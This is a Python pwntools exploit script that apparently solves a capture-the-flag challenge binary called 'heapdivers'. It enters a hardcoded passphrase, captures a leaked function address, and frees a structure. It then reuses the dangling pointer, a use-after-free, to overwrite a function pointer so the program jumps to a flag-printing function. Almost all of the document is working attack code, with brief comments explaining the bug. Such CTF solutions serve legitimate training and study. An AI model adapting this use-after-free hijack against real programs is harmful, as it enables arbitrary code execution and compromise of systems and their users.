from pwn import *


exe = './heapdivers'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

io = process(exe)

# Verify identity
io.sendlineafter(b'[F]lee', b'E')
io.sendlineafter(b' ', b'tounsec')

# Leak plant_the_flag memory address
io.sendlineafter(b'[F]lee', b'S')
io.recvuntil(b'Wow, Is this a memory leak ? ', drop=True)
leak = int(io.recvline(), 16)
info("Leaked plant_the_flag() address : %#x", leak)

# Free helldivers
io.sendlineafter(b'[F]lee', b'X')
io.sendlineafter(b'?', b'Y')


# The “*last_word” malloc uses the same chunk as the free malloc previously because the pointer was not reset (e.g : *heapdivers = NULL)
io.sendlineafter(b'[F]lee', b'L')
io.sendlineafter(b' ', flat(leak))
# After, the call_stratagem() function execute the function pointer stratagem() in struct action who pointed towards the plant_the_flag() function

# Print Flag
success(io.recvlines(3)[2].decode())
